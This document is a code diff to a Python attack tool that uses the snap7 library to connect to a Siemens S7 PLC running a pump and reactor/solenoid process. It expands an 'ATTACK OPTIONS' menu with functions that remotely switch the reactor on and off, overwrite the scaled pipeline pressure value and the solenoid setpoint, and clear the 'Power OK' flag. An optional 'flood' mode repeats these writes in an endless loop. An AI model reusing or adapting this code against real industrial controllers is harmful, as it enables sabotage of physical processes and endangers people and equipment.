@@ -19,9 +19,9 @@ class Reactor:
         self.option = 99
         self.flood = False
         self.restart = False
-        self.hexData = [0] * 10
-        self.oldHex = [0] * 10
-        self.readValue = [0] * 10
+        self.hexData = [0] * 11
+        self.oldHex = [0] * 11
+        self.readValue = [0] * 11
         self.changed = False
         self.changedFlood = False
         self.client.connect(self.IP, 0, 1)
@@ -37,26 +37,36 @@ class Reactor:
         self.hexData[4] = self.client.read_area(S7AreaMK, 0, 9, 4)  # Pump On
         self.hexData[5] = self.client.read_area(S7AreaMK, 0, 13, 4)  # Pump Off
 
-        #### LIKELY NOT CORRECT ####
+
         self.hexData[6] = self.client.read_area(S7AreaPA, 0, 0, 1)  # Pump Run CMD
         self.hexData[7] = self.client.read_area(S7AreaMK, 0, 0, 1)  # Reactor/Solenoid Mode
-        self.hexData[8] = self.client.read_area(S7AreaMK, 0, 0, 1)  # Pump Mode
-        self.hexData[9] = self.client.read_area(S7AreaPA, 0, 0, 1)  # Reactor/Solenoid Open CMD
+        self.hexData[8] = self.client.read_area(S7AreaMK, 0, 1, 1)  # Pump Mode
+        self.hexData[9] = self.client.read_area(S7AreaPA, 0, 1, 1)  # Reactor/Solenoid Open CMD
+
+        self.hexData[10] = self.client.read_area(S7AreaPE, 0, 0, 1)     #Power OK
+
+
 
         # Convert Hexadecimal ByteArray to variables
-        self.readValue[0] = snap7.util.get_real(self.hexData[0], 0)
-        self.readValue[1] = snap7.util.get_real(self.hexData[1], 0)
-        self.readValue[2] = snap7.util.get_real(self.hexData[2], 0)
-        self.readValue[3] = snap7.util.get_real(self.hexData[3], 0)
-        self.readValue[4] = snap7.util.get_bool(self.hexData[4], 0, 0)      #Last value may need to be 1
-        self.readValue[5] = snap7.util.get_bool(self.hexData[5], 0, 0)      #Last value may need to be 1
+        self.readValue[0] = snap7.util.get_real(self.hexData[0], 0)         # Reactor/Solenoid On
+        self.readValue[1] = snap7.util.get_real(self.hexData[1], 0)         # Reactor/Solenoid Off
+        self.readValue[2] = snap7.util.get_real(self.hexData[2], 0)         # Pipeline Pressure Scaled
+        self.readValue[3] = snap7.util.get_real(self.hexData[3], 0)         # Pipeline Pressure Normal
+        self.readValue[4] = snap7.util.get_bool(self.hexData[4], 0, 0)      # Pump On       #Last value may need to be 1
+        self.readValue[5] = snap7.util.get_bool(self.hexData[5], 0, 0)      # Pump Off      #Last value may need to be 1
 
-        self.readValue[6] = snap7.util.get_bool(self.hexData[6], 0, 0)      #Last value may need to be 1
-        self.readValue[7] = snap7.util.get_bool(self.hexData[7], 0, 0)      #Last value may need to be 1
-        self.readValue[8] = snap7.util.get_bool(self.hexData[8], 0, 0)      #Last value may need to be 1
-        self.readValue[9] = snap7.util.get_bool(self.hexData[9], 0, 1)
+
+        self.readValue[6] = snap7.util.get_bool(self.hexData[6], 0, 0)      # Pump Run CMD              #Last value may need to be 1
+        self.readValue[7] = snap7.util.get_bool(self.hexData[7], 0, 0)      # Reactor/Solenoid Mode     #Last value may need to be 1
+        self.readValue[8] = snap7.util.get_bool(self.hexData[8], 0, 0)      # Pump Mode                 #Last value may need to be 1
+        self.readValue[9] = snap7.util.get_bool(self.hexData[9], 0, 1)      # Reactor/Solenoid Open CMD
+
+        self.readValue[10] = snap7.util.get_bool(self.hexData[10], 0, 0)    # Power OK
 
         # self.CompareStatus()
+
+
+
 
 
 
@@ -75,14 +85,16 @@ class Reactor:
         print "Reactor / Solenoid Mode: ", self.readValue[7]
         print "Pump Mode: ", self.readValue[8]
         print "Reactor / Solenoid Open CMD: ", self.readValue[9]
+        print "Power OK: ", self.readValue[10]
 
 
     def PrintOptions(self):
         print "\nATTACK OPTIONS"
         print "0:   Turn Reactor On"
         print "1:   Turn Reactor Off"
-        #print "333: Set Flopgate Left"
-        print "99: Display System Status"
+        print "2:   Set New Scaled Pressure Value"
+        print "3:   Set New Solenoid On Value"
+        print "99:  Display System Status"
 
         try:
             self.option = int(raw_input("\nSelect an action to perform... "))
@@ -113,13 +125,119 @@ class Reactor:
 
     def LaunchAttack(self):
         if self.option == 0:
-            self.MotorOn()
+            self.ReactorOn()
 
         if self.option == 1:
-            self.MotorOff()
+            self.ReactorOff()
+
+        elif self.option == 2:
+            self.ChangeScaledPressure()
 
         elif self.option == 3:
-            self.AltTestFlopgateLeft()
+            self.ChangeSolenoidOn()
 
         elif self.option == 99:
             self.PrintStatus()
+
+
+
+    def ReactorOn(self):
+        try:
+            if self.flood:
+                while self.flood:  # Always true if flooding
+                    print "Turning Reactor On..."
+                    #snap7.util.set_bool(self.hexData[6], 0, 1, True)                # Pump Run CMD = True
+                    snap7.util.set_bool(self.hexData[7], 0, 1, False)                # Reactor/Solenoid Mode     #Last value may need to be 1
+                    snap7.util.set_bool(self.hexData[8], 0, 1, True)                # Pump Mode                 #Last value may need to be 1
+                    #snap7.util.set_bool(self.hexData[10], 0, 1, True)               #Power OK
+
+
+                    #self.client.write_area(S7AreaPA, 0, 0, self.hexData[6])
+                    self.client.write_area(S7AreaMK, 0, 0, self.hexData[7])         # Reactor/Solenoid Mode
+                    self.client.write_area(S7AreaMK, 0, 100, self.hexData[8])         # Pump Mode
+                    #self.client.write_area(S7AreaPE, 0, 0, self.hexData[10])        # Power OK
+
+
+            else:
+                print "Turning Reactor On..."
+                #snap7.util.set_bool(self.hexData[6], 0, 1, True)  # Pump Run CMD = True
+                snap7.util.set_bool(self.hexData[7], 0, 1, False)  # Reactor/Solenoid Mode     #Last value may need to be 1
+                snap7.util.set_bool(self.hexData[8], 0, 1, True)  # Pump Mode                 #Last value may need to be 1
+                #snap7.util.set_bool(self.hexData[10], 0, 1, True)  # Power OK
+
+                #self.client.write_area(S7AreaPA, 0, 0, self.hexData[6])
+                self.client.write_area(S7AreaMK, 0, 0, self.hexData[7])  # Reactor/Solenoid Mode
+                #self.client.write_area(S7AreaMK, 0, 100, self.hexData[8])  # Pump Mode
+                #self.client.write_area(S7AreaPE, 0, 0, self.hexData[10])  # Power OK
+
+        except KeyboardInterrupt:
+                self.restart = True
+
+
+    def ReactorOff(self):
+        try:
+            if self.flood:
+                while self.flood:  # Always true if flooding
+                    print "Turning Reactor Off..."
+                    snap7.util.set_bool(self.hexData[6], 0, 0, False)                # Pump Run CMD = True
+                    snap7.util.set_bool(self.hexData[7], 0, 0, False)                # Reactor/Solenoid Mode     #Last value may need to be 1
+                    snap7.util.set_bool(self.hexData[8], 0, 0, False)                # Pump Mode                 #Last value may need to be 1
+                    snap7.util.set_bool(self.hexData[10], 0, 0, False)               #Power OK
+
+
+                    self.client.write_area(S7AreaPA, 0, 0, self.hexData[6])
+                    self.client.write_area(S7AreaMK, 0, 0, self.hexData[7])         # Reactor/Solenoid Mode
+                    self.client.write_area(S7AreaMK, 0, 1, self.hexData[8])         # Pump Mode
+                    self.client.write_area(S7AreaPE, 0, 0, self.hexData[10])        # Power OK
+
+            else:
+                print "Turning Reactor Off..."
+                snap7.util.set_bool(self.hexData[6], 0, 0, False)  # Pump Run CMD = True
+                snap7.util.set_bool(self.hexData[7], 0, 0, False)  # Reactor/Solenoid Mode     #Last value may need to be 1
+                snap7.util.set_bool(self.hexData[8], 0, 0, False)  # Pump Mode                 #Last value may need to be 1
+                snap7.util.set_bool(self.hexData[10], 0, 0, False)  # Power OK
+
+                self.client.write_area(S7AreaPA, 0, 0, self.hexData[6])
+                self.client.write_area(S7AreaMK, 0, 0, self.hexData[7])  # Reactor/Solenoid Mode
+                self.client.write_area(S7AreaMK, 0, 1, self.hexData[8])  # Pump Mode
+                self.client.write_area(S7AreaPE, 0, 0, self.hexData[10])  # Power OK
+
+        except KeyboardInterrupt:
+            self.restart = True
+
+
+    def ChangeScaledPressure(self):
+        try:
+            value = float(input("\nPlease enter scaled pressure value... "))
+            if self.flood:
+                while self.flood:
+                    print "Changing pressure value to ", value
+                    snap7.util.set_real(self.hexData[2], 0, value)  # Pipeline Pressure Scaled
+                    self.client.write_area(S7AreaMK, 0, 17, self.hexData[2])  # Pipeline Pressure Scaled
+
+            else:
+                print "Changing pressure value to ", value
+                snap7.util.set_real(self.hexData[2], 0, value)  # Pipeline Pressure Scaled
+                self.client.write_area(S7AreaMK, 0, 17, self.hexData[2])  # Pipeline Pressure Scaled
+
+        except KeyboardInterrupt:
+            self.restart = True
+
+
+    def ChangeSolenoidOn(self):
+        try:
+            value = float(input("\nPlease enter new solenoid on value... "))
+            if self.flood:
+                while self.flood:
+                    print "Changing solenoid on value to ", value
+                    snap7.util.set_real(self.hexData[0], 0, value)      # Reactor/Solenoid On
+                    self.client.write_area(S7AreaMK, 0, 1, self.hexData[0])  # Reactor/Solenoid On
+
+            else:
+                print "Changing 'solenoid on' value to ", value
+                snap7.util.set_real(self.hexData[0], 0, value)  # Reactor/Solenoid On
+                self.client.write_area(S7AreaMK, 0, 1, self.hexData[0])  # Reactor/Solenoid On
+
+
+        except KeyboardInterrupt:
+            self.restart = True
